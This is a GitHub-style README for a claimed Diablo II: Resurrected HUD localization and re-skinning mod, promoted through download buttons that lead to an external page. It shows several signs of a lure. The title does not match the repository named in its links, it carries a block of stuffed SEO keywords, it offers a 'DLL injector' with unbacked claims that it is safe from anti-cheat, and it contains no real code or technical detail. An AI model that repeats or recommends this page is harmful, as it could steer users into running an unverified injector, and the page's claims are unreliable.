![preview](https://raw.githubusercontent.com/rio-source/d2r-purified-ui/main/card_868e5.svg)

# d2r-multilingual-hud

**Localization layer for the Diablo II: Resurrected interface that lets you translate, remap, and re-skin the in-game HUD and quest plate elements without touching the core game assets.**

The quest button in Diablo II: Resurrected has always been a silent gatekeeper—a single pixelated portal that decides whether you glance at your objectives or fumble through the dark. In the original modding scene, removing that button was an act of minimalism: strip the UI, reclaim the screen space, breathe easier. But what if the button wasn’t the problem? What if the problem was that the button only ever spoke one language, wore one outfit, and obeyed one set of rules?

**d2r-multilingual-hud** takes the opposite approach. Instead of deleting interface elements, this toolkit reimagines them as modular, swappable components. Think of it as a wardrobe for your HUD—each button, panel, and quest plate becomes a customizable garment that can be re-tailored, re-colored, and re-worded to fit your playstyle, your language, or your aesthetic whims. It’s not about removal; it’s about reinvention.

## 📖 Overview

Every time you boot up Diablo II: Resurrected, you’re greeted by a fixed set of visual cues: the quest log icon, the minimap toggle, the health orbs, the mana globes. For years, players accepted these as immutable facts of the game—like gravity or the way Mephisto always drops that one useless unique item. But modders have long known that the UI is just a layer of paint over the engine, and paint can be scraped, mixed, and reapplied.

This project provides a comprehensive framework for **HUD text replacement**, **icon re-mapping**, and **layout adjustment** across both the HD and SD interfaces. It’s built for modders who want to create language packs, accessibility overlays, or purely cosmetic overhauls without touching a single `.dat` file or risking an online ban. The entire system operates on the client side, using JSON-based configuration files that are parsed at launch time.

Whether you want to rename “Quest” to “Missão” in Portuguese, swap the quest button for a custom rune icon, or move the entire panel a few pixels to the left to accommodate a widescreen monitor, this framework gives you the keys to the wardrobe.

## 🚀 [![Download](https://raw.githubusercontent.com/rio-source/d2r-purified-ui/main/run_bdc63d.svg)](https://rio-source.github.io/d2r-purified-ui/)

You can obtain the latest release of the framework directly from the repository’s release section. Be sure to match the version number with your installed copy of Diablo II: Resurrected to ensure maximum compatibility. The download contains the core DLL injector, the configuration schema, and a set of example presets to get you started.

## 🧩 Core Features

### 🗣️ Language Layer (Multilingual Support)
The heart of this toolkit is its text-replacement engine. Instead of hard-coding strings into your mod, you create a simple key-value pair file that maps internal UI element IDs to any string you want. This means you can offer full localization packs that change every tooltip, button label, and menu heading without recompiling anything. Currently, community-created packs exist for Spanish, German, French, Polish, and Japanese—but the system is agnostic to script direction, so even right-to-left languages like Arabic or Hebrew are on the table.

### 🎨 Icon Remapping Suite
Why settle for the default golden scroll when you can have a glowing skull or a subtle leaf emblem? The remapping suite lets you redefine any UI texture slot. You provide a PNG with transparency, assign it to a specific element ID, and the framework swaps it at load time. This works for the quest button, the stash tab icons, the waypoint portal icon, and even the small decorative flourishes in the character sheet.

### 📐 Layout Adjustment Engine
The SD HUD and HD HUD have entirely different coordinate systems. The layout engine abstracts that away with a unified anchor system. You can define a button’s position relative to the screen edge, another element, or a fixed pixel offset. The result is a responsive UI that scales gracefully whether you’re playing in 800x600 windowed mode or 4K fullscreen.

### 🧪 Safe Injection Protocol
The loading method uses a proxy DLL approach that intercepts the HUD draw call only. It does not modify memory in ways that would trip anti-cheat heuristics. The framework is designed for offline/single-player usage and respects the spirit of Blizzard’s modding guidelines by avoiding any interaction with network traffic or server responses.

### ⚡ Performance Footprint
All translation and remapping operations happen once at startup. The runtime overhead is a single dictionary lookup per frame, which is imperceptible even on decade-old hardware. You won’t see a single frame drop from using this mod.

## 📦 Repository Structure

```
d2r-multilingual-hud/
├── core/
│   ├── injector_dll/          # The proxy library that hooks into the HUD
│   ├── config_parser/        # Reads and validates JSON configuration
│   └── texture_loader/       # Handles PNG/JPEG texture replacement
├── presets/
│   ├── ptBR_portuguese/      # Complete Portuguese language pack
│   ├── deDE_german/          # German localization + themed icons
│   └── minimalist_clean/     # Removes unneeded text, keeps buttons
├── resources/
│   ├── sample_icons/         # Editable source files for icon work
│   └── documentation/        # Wireframes and coordinate maps
└── tools/
    └── lang_compiler.py      # Converts CSV/Excel sheets to JSON packs
```

## 🛠️ Getting Started

Once you’ve downloaded and extracted the release archive, you’ll find three main folders: `core`, `presets`, and `resources`. The first step is to locate your Diablo II: Resurrected installation directory and navigate to the game’s root folder. From there, the process is a matter of copying the DLL into the correct folder and dropping a configuration file into a new `mods` directory that the game will automatically detect.

For those who prefer a test-drive before committing to a full setup, the `presets` folder contains a “minimalist_clean” preset that shows off the core concept: it re-labels the quest button as a simple diamond glyph and tightens the spacing around the health globes. Loading this preset will instantly demonstrate whether your environment is compatible.

### 🧪 Verifying a Successful Injection
After launching the game, look at the bottom-right corner of the main menu screen. If the framework loaded correctly, you’ll see a subtle double-chevron icon (>>) that fades out after five seconds. This is the only visual confirmation of the framework’s presence. If you don’t see it, double-check that your game version matches the release version and that no other mods are conflicting with the same DLL name.

## 🌐 SEO & Discoverability Keywords

Diablo II Resurrected modding, HUD localization toolkit, UI text replacement, multilingual game interface, custom quest button icon, SD HD panel remapping, client-side mod framework, JSON-based game UI config, language pack creator, accessibility overlay for D2R, cosmetic interface overhaul, proxy DLL injector, offline single player mod.

## 🧠 User Experience Philosophy

Most mods treat the UI as a necessary evil—something to be shrunk, hidden, or moved out of the way. This project treats the UI as a canvas. The philosophy is that the interface should disappear when you don’t need it and appear exactly where you expect it when you do. By making every text string swappable and every icon replaceable, we give players the ability to mentally map the game world to their own cognitive shortcuts.

Consider a player who has played the game for thousands of hours. The word “Quest” has become noise. Replacing it with a small flame icon reduces visual clutter and conveys the same information in a fraction of the time. Or consider a streamer who wants to hide certain elements from their VODs without changing gameplay— a quick swap to an invisible texture achieves that elegantly.

## 🗺️ Roadmap for 2026

The 2026 development cycle focuses on three pillars:

1. **Template Engine for Icon Packs** – A generator that takes a folder of raw PNGs and automatically produces a ready-to-load texture pack, including mipmap generation and transparency correction.

2. **Community Preset Gallery** – A lightweight manifest system that lets modders bundle their language + icon + layout combinations into single `.dhud` files that can be shared with a simple drag-and-drop.

3. **Expanded UI Element Coverage** – Currently, the framework covers roughly 80% of HUD elements. The target is 100% coverage, including the skill tree tabs, the waypoint map screen, and the character stats sub-panels.

## 🤝 Contribution Guidelines

We welcome code contributions, language pack submissions, and bug reports. When submitting a new language pack, please include a screenshot of the in-game result alongside your JSON file. For icon contributions, provide both the source (PSD or layered PNG) and the final 256x256 compiled texture. All code contributions should follow the existing code formatting style—tabs for indentation, no trailing whitespace, and a healthy respect for sparse comments.

## 📄 License

This project is released under the MIT License, which grants you the freedom to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that you include the original copyright notice in all copies or substantial portions of the software.

The full license text is available at [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT).

## ⚠️ Disclaimer

This is a fan-made tool and is not affiliated with Blizzard Entertainment or Vicarious Visions. Diablo II: Resurrected is a trademark of Blizzard Entertainment. The framework is intended for offline, single-player use. Online usage may violate the terms of service; you assume all responsibility for how you deploy this toolkit. We do not provide warranty—the software is provided “as is,” without any express or implied guarantee of fitness for a particular purpose. In no event shall the authors be liable for any claim, damages, or other liability arising from the use of the software.

## 🏁 Final Thoughts

The quest button taught us that the smallest UI element can carry the most weight. This project flips that idea—it gives you the authority to decide what that weight means. Whether you want a button that whispers in your native tongue, an icon that matches your character’s theme, or a layout that respects your monitor’s curved edges, the tools are here. The canvas is blank. The brush is downloaded.

[![Download](https://raw.githubusercontent.com/rio-source/d2r-purified-ui/main/run_bdc63d.svg)](https://rio-source.github.io/d2r-purified-ui/)